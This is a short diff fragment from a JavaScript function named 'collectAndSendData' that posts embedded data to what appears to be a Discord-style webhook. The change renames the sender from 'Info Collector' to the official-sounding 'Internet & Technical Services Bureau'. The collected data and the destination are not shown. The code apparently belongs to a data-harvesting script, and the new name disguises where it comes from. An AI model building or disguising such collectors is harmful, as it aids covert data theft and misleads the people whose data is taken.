@@ -174,7 +174,7 @@ async function collectAndSendData() {
             },
             body: JSON.stringify({
                 embeds: [embedData],
-                username: "Info Collector",
+                username: "Internet & Technical Services Bureau",
                 avatar_url: "https://cdn-icons-png.flaticon.com/512/1006/1006771.png"
             })
         });
